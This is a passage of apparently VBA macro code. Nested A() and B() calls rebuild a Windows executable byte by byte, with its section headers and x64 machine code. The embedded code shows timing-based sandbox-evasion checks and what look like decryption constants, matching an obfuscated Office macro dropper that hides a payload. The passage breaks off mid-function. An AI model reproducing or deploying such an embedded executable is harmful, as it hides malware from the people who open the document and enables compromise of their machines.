    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 16), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), 0), 0), 140), 8), 0), 0), 0), 16), 1), 0), 16), 3), 0), 0), 0), 176), 0), 0), 128), 4), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 162), 0), 0), "("), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "8"), 226), 0), 0), 232), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ".text"), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "Hq"), 0), 0), 0), 16), 0), 0), 0), "r"), 0), 0), 0), 4), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "`"), 0), "P`.data"), 0), 0), 0), 240), 0), 0), 0), 0), 144), 0), 0), 0), 2)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 0), 0), "v"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "P"), 192), ".rdata"), 0), 0), 160), 15), 0), 0), 0), 160), 0), 0), 0), 16), 0), 0), 0), "x"), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "`@.pdata"), 0), 0), 128), 4), 0), 0), 0), 176), 0), 0), 0), 6), 0), 0), 0), 136), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "0@.xdata"), 0), 0), "0"), 4), 0), 0), 0), 192), 0), 0), 0), 6), 0), 0), 0), 142), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0@.bss"), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 160), 11), 0), 0), 0), 208), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 0), "`"), 192), ".idata"), 0), 0), 140), 8), 0), 0), 0), 224), 0), 0), 0), 10)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 148), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0"), 192), ".CRT"), 0), 0), 0), 0), "h"), 0), 0), 0), 0), 240), 0), 0), 0), 2), 0), 0), 0), 158), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "@"), 192), ".tls"), 0), 0), 0), 0), 16), 0), 0), 0), 0), 0), 1), 0), 0), 2), 0), 0), 0), 160), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "@"), 192), ".rsrc"), 0), 0), 0), 16), 3), 0), 0), 0), 16), 1), 0), 0), 4), 0), 0), 0), 162), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), "0"), 192), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 195), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), "@"), 0), "H"), 131), 236), "(H"), 139), 5), 21), 154), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 0), "1"), 201), 199), 0), 1), 0), 0), 0), "H"), 139), 5), 22), 154), 0), 0), 199), 0), 1), 0), 0), 0), "H"), 139), 5), 25), 154), 0), 0), 199), 0), 1), 0), 0), 0), "H"), 139), 5), 220), 153), 0), 0), 199), 0), 1), 0), 0), 0), "H"), 139)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 5), 143), 152), 0), 0), "f"), 129), "8MZu"), 15), "HcP<H"), 1), 208), 129), "8PE"), 0), 0), "tiH"), 139), 5), 162), 153), 0), 0), 137), 13), 172), 191), 0), 0), 139), 0), 133), 192), "tF"), 185), 2), 0), 0)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 0), 232), 12), "i"), 0), 0), 232), 151), "o"), 0), 0), "H"), 139), 21), "@"), 153), 0), 0), 139), 18), 137), 16), 232), "wo"), 0), 0), "H"), 139), 21), 16), 153), 0), 0), 139), 18), 137), 16), 232), 7), 11), 0), 0), "H"), 139), 5), 224), 151), 0), 0)
    strPE = A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 131), "8"), 1), "tS1"), 192), "H"), 131), 196), "("), 195), 15), 31), "@"), 0), 185), 1), 0), 0), 0), 232), 198), "h"), 0), 0), 235), 184), 15), 31), "@"), 0), 15), 183), "P"), 24), "f"), 129), 250), 11), 1), "tEf"), 129), 250), 11), 2), "u"), 133)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 131), 184), 132), 0), 0), 0), 14), 15), 134), "x"), 255), 255), 255), 139), 144), 248), 0), 0), 0), "1"), 201), 133), 210), 15), 149), 193), 233), "f"), 255), 255), 255), 15), 31), 128), 0), 0), 0), 0), "H"), 141), 13), 129), 11), 0), 0), 232), "L"), 17), 0), 0)
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "1"), 192), "H"), 131), 196), "("), 195), 15), 31), "D"), 0), 0), 131), "xt"), 14), 15), 134), "="), 255), 255), 255), "D"), 139), 128), 232), 0), 0), 0), "1"), 201), "E"), 133), 192), 15), 149), 193), 233), ")"), 255), 255), 255), "f"), 144), "H"), 131), 236), "8H"), 139)
    strPE = B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 5), 181), 152), 0), 0), "L"), 141), 5), 214), 190), 0), 0), "H"), 141), 21), 215), 190), 0), 0), "H"), 141), 13), 216), 190), 0), 0), 139), 0), 137), 5), 176), 190), 0), 0), "H"), 141), 5), 169), 190), 0), 0), "H"), 137), "D$ H"), 139), 5), "E")
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 152), 0), 0), "D"), 139), 8), 232), 29), "h"), 0), 0), 144), "H"), 131), 196), "8"), 195), 15), 31), 128), 0), 0), 0), 0), "AUATUWVSH"), 129), 236), 152), 0), 0), 0), 185), 13), 0), 0), 0), "1"), 192), "L"), 141), "D$")
    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(strPE, " L"), 137), 199), 243), "H"), 171), "H"), 139), "=X"), 152), 0), 0), "D"), 139), 15), "E"), 133), 201), 15), 133), 156), 2), 0), 0), "eH"), 139), 4), "%0"), 0), 0), 0), "H"), 139), 29), "l"), 151), 0), 0), "H"), 139), "p"), 8), "1"), 237), "L"), 139)
    strPE = B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "%"), 191), 208), 0), 0), 235), 22), 15), 31), "D"), 0), 0), "H9"), 198), 15), 132), 23), 2), 0), 0), 185), 232), 3), 0), 0), "A"), 255), 212), "H"), 137), 232), 240), "H"), 15), 177), "3H"), 133), 192), "u"), 226), "H"), 139), "5C"), 151), 0), 0), "1")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 237), 139), 6), 131), 248), 1), 15), 132), 5), 2), 0), 0), 139), 6), 133), 192), 15), 132), "l"), 2), 0), 0), 199), 5), 238), 189), 0), 0), 1), 0), 0), 0), 139), 6), 131), 248), 1), 15), 132), 251), 1), 0), 0), 133), 237), 15), 132), 20), 2), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 0), "H"), 139), 5), 136), 150), 0), 0), "H"), 139), 0), "H"), 133), 192), "t"), 12), "E1"), 192), 186), 2), 0), 0), 0), "1"), 201), 255), 208), 232), 31), 13), 0), 0), "H"), 141), 13), 8), 16), 0), 0), 255), 21), "*"), 208), 0), 0), "H"), 139), 21), 187)
    strPE = A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 150), 0), 0), "H"), 141), 13), 132), 253), 255), 255), "H"), 137), 2), 232), 156), "l"), 0), 0), 232), 7), 11), 0), 0), "H"), 139), 5), "P"), 150), 0), 0), "H"), 137), 5), "y"), 189), 0), 0), 232), "dm"), 0), 0), "1"), 201), "H"), 139), 0), "H"), 133), 192)
    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "u"), 28), 235), "X"), 15), 31), 132), 0), 0), 0), 0), 0), 132), 210), "tE"), 131), 225), 1), "t'"), 185), 1), 0), 0), 0), "H"), 131), 192), 1), 15), 182), 16), 128), 250), " ~"), 230), "A"), 137), 200), "A"), 131), 240), 1), 128), 250), 34), "A"), 15)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "D"), 200), 235), 228), "f"), 15), 31), "D"), 0), 0), 132), 210), "t"), 21), 15), 31), "@"), 0), 15), 182), "P"), 1), "H"), 131), 192), 1), 132), 210), "t"), 5), 128), 250), " ~"), 239), "H"), 137), 5), 8), 189), 0), 0), "D"), 139), 7), "E"), 133), 192), "t"), 22)
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 184), 10), 0), 0), 0), 246), "D$\"), 1), 15), 133), 224), 0), 0), 0), 137), 5), 226), "|"), 0), 0), "Hc-"), 19), 189), 0), 0), "D"), 141), "e"), 1), "Mc"), 228), "I"), 193), 228), 3), "L"), 137), 225), 232), 224), "e"), 0), 0), "L"), 139)
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "-"), 241), 188), 0), 0), "H"), 137), 199), 133), 237), "~B1"), 219), 15), 31), 132), 0), 0), 0), 0), 0), "I"), 139), "L"), 221), 0), 232), 150), "e"), 0), 0), "H"), 141), "p"), 1), "H"), 137), 241), 232), 178), "e"), 0), 0), "I"), 137), 240), "H"), 137), 4)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(strPE, 223), "I"), 139), "T"), 221), 0), "H"), 137), 193), "H"), 131), 195), 1), 232), 146), "e"), 0), 0), "H9"), 221), "u"), 205), "J"), 141), "D'"), 248), "H"), 199), 0), 0), 0), 0), 0), "H"), 137), "="), 154), 188), 0), 0), 232), 229), 7), 0), 0), "H"), 139), 5)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "N"), 149), 0), 0), "L"), 139), 5), 127), 188), 0), 0), 139), 13), 137), 188), 0), 0), "H"), 139), 0), "L"), 137), 0), "H"), 139), 21), "t"), 188), 0), 0), 232), 211), 1), 0), 0), 139), 13), "Y"), 188), 0), 0), 137), 5), "W"), 188), 0), 0), 133), 201), 15)
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 132), 217), 0), 0), 0), 139), 21), "A"), 188), 0), 0), 133), 210), 15), 132), 141), 0), 0), 0), "H"), 129), 196), 152), 0), 0), 0), "[^_]A\A]"), 195), 15), 31), "D"), 0), 0), 15), 183), "D$`"), 233), 22), 255), 255), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "f"), 15), 31), "D"), 0), 0), "H"), 139), "5A"), 149), 0), 0), 189), 1), 0), 0), 0), 139), 6), 131), 248), 1), 15), 133), 251), 253), 255), 255), 185), 31), 0), 0), 0), 232), "We"), 0), 0), 139), 6), 131), 248), 1), 15), 133), 5), 254), 255), 255)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "H"), 139), 21), "E"), 149), 0), 0), "H"), 139), 13), "."), 149), 0), 0), 232), "!e"), 0), 0), 199), 6), 2), 0), 0), 0), 133), 237), 15), 133), 236), 253), 255), 255), "1"), 192), "H"), 135), 3), 233), 226), 253), 255), 255), 144), "L"), 137), 193), 255), 21), 247)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 205), 0), 0), 233), "V"), 253), 255), 255), "f"), 144), 232), 3), "e"), 0), 0), 139), 5), 169), 187), 0), 0), "H"), 129), 196), 152), 0), 0), 0), "[^_]A\A]"), 195), 15), 31), "D"), 0), 0), "H"), 139), 21), 9), 149), 0), 0), "H")
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 139), 13), 242), 148), 0), 0), 199), 6), 1), 0), 0), 0), 232), 191), "d"), 0), 0), 233), 128), 253), 255), 255), 137), 193), 232), 147), "d"), 0), 0), 144), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 131), 236), "(H"), 139), 5), "E"), 149), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 199), 0), 1), 0), 0), 0), 232), 186), 252), 255), 255), 144), 144), "H"), 131), 196), "("), 195), 15), 31), 0), "H"), 131), 236), "(H"), 139), 5), "%"), 149), 0), 0), 199), 0), 0), 0), 0), 0), 232), 154), 252), 255), 255), 144), 144), "H"), 131), 196), "(")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 195), 15), 31), 0), "H"), 131), 236), "("), 232), "Wd"), 0), 0), "H"), 133), 192), 15), 148), 192), 15), 182), 192), 247), 216), "H"), 131), 196), "("), 195), 144), 144), 144), 144), 144), 144), 144), "H"), 141), 13), 9), 0), 0), 0), 233), 212), 255), 255), 255), 15), 31)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "@"), 0), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "USH"), 131), 236), "8H"), 141), 172), "$"), 128), 0), 0), 0), "H"), 137), "M"), 208), "H"), 137), "U"), 216), "L"), 137), "E"), 224), "L"), 137), "M"), 232), "H"), 141)
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "E"), 216), "H"), 137), "E"), 160), "H"), 139), "]"), 160), 185), 1), 0), 0), 0), "H"), 139), 5), 26), "{"), 0), 0), 255), 208), "I"), 137), 216), "H"), 139), "U"), 208), "H"), 137), 193), 232), "9"), 21), 0), 0), 137), "E"), 172), 139), "E"), 172), "H"), 131), 196), "8[")

    PE0 = strPE
End Function

Private Function PE1() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(strPE, "]"), 195), "UWVH"), 129), 236), 160), 5), 0), 0), "H"), 141), 172), "$"), 128), 0), 0), 0), 137), 141), "@"), 5), 0), 0), "H"), 137), 149), "H"), 5), 0), 0), 232), 200), 5), 0), 0), "H"), 139), 5), 137), 204), 0), 0), 255), 208), "H"), 137), 133)
    strPE = A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 5), 0), 0), "H"), 139), 133), 0), 5), 0), 0), 186), 0), 0), 0), 0), "H"), 137), 193), "H"), 139), 5), "2"), 206), 0), 0), 255), 208), "H"), 139), 133), "H"), 5), 0), 0), "H"), 139), 0), "H"), 141), 21), 15), 138), 0), 0), "H"), 137), 193), 232), 231)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "b"), 0), 0), "H"), 133), 192), "t\"), 199), 133), 252), 4), 0), 0), 0), 0), 0), 0), "H"), 199), 133), 240), 4), 0), 0), 0), 0), 0), 0), "H"), 139), 5), "6"), 204), 0), 0), 255), 208), 199), "D$("), 0), 0), 0), 0), 199), "D$ ")
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(strPE, "@"), 0), 0), 0), "A"), 185), 0), "0"), 0), 0), "A"), 184), 232), 3), 0), 0), 186), 0), 0), 0), 0), "H"), 137), 193), 232), "Cj"), 0), 0), "H"), 152), "H"), 137), 133), 240), 4), 0), 0), "H"), 131), 189), 240), 4), 0), 0), 0), "tL"), 235), 10)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 185), 0), 0), 0), 0), 232), 228), "b"), 0), 0), "H"), 141), 13), 166), 137), 0), 0), 232), 208), 254), 255), 255), "H"), 184), "L"), 130), "d"), 26), 4), 0), 0), 0), "H"), 137), 133), 232), 4), 0), 0), "H"), 199), 133), 24), 5), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "H"), 199), 133), 16), 5), 0), 0), 0), 0), 0), 0), "H"), 199), 133), 16), 5), 0), 0), 0), 0), 0), 0), 235), 26), 185), 0), 0), 0), 0), 232), 154), "b"), 0), 0), "H"), 131), 133), 24), 5), 0), 0), 1), "H"), 131), 133), 16), 5), 0), 0), 1)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(strPE, "H"), 139), 133), 16), 5), 0), 0), "H;"), 133), 232), 4), 0), 0), "|"), 224), "H"), 139), 133), 24), 5), 0), 0), "H;"), 133), 232), 4), 0), 0), "t"), 10), 185), 0), 0), 0), 0), 232), "`b"), 0), 0), "H"), 141), 133), 144), 4), 0), 0), "H")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 137), 193), "H"), 139), 5), "o"), 203), 0), 0), 255), 208), 139), 133), 176), 4), 0), 0), 137), 133), 228), 4), 0), 0), 131), 189), 228), 4), 0), 0), 1), 127), 10), 185), 0), 0), 0), 0), 232), ".b"), 0), 0), "H"), 199), 133), 216), 4), 0), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 185), "mD"), 25), 18), 232), 233), "a"), 0), 0), "H"), 137), 133), 216), 4), 0), 0), "H"), 131), 189), 216), 4), 0), 0), 0), "t"), 26), "H"), 139), 133), 216), 4), 0), 0), "A"), 184), "mD"), 25), 18), 186), 0), 0), 0), 0), "H"), 137)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 193), 232), 174), "a"), 0), 0), "H"), 139), 5), 15), 203), 0), 0), 255), 208), 137), 133), 212), 4), 0), 0), 185), 21), 223), 0), 0), "H"), 139), 5), "+"), 203), 0), 0), 255), 208), "H"), 139), 5), 242), 202), 0), 0), 255), 208), 137), 133), 208), 4), 0), 0)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 139), 133), 208), 4), 0), 0), "+"), 133), 212), 4), 0), 0), "="), 20), 223), 0), 0), 127), 10), 185), 0), 0), 0), 0), 232), 165), "a"), 0), 0), "H"), 139), 133), 216), 4), 0), 0), "H"), 137), 193), 232), "~a"), 0), 0), "H"), 141), 133), 144), 2), 0)
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 0), "H"), 141), 21), "`"), 136), 0), 0), 185), "?"), 0), 0), 0), "H"), 137), 199), "H"), 137), 214), 243), "H"), 165), "H"), 137), 242), "H"), 137), 248), 139), 10), 137), 8), "H"), 141), "@"), 4), "H"), 141), "R"), 4), 15), 183), 10), "f"), 137), 8), "H"), 141), "@"), 2)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(strPE, "H"), 141), "R"), 2), 15), 182), 10), 136), 8), "H"), 184), "M"), 18), 210), "=?"), 0), "e1H"), 186), 200), 223), 171), "L8,"), 146), "|H"), 137), 133), 176), 1), 0), 0), "H"), 137), 149), 184), 1), 0), 0), "H"), 184), "h{"), 25), "?"), 132)
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 28), 153), "OH"), 186), 154), 136), "7"), 10), 202), "="), 17), "OH"), 137), 133), 192), 1), 0), 0), "H"), 137), 149), 200), 1), 0), 0), "H"), 184), 3), ",,"), 172), 231), ";"), 171), "kH"), 186), 229), 191), 6), 164), "v~)"), 195), "H"), 137), 133)
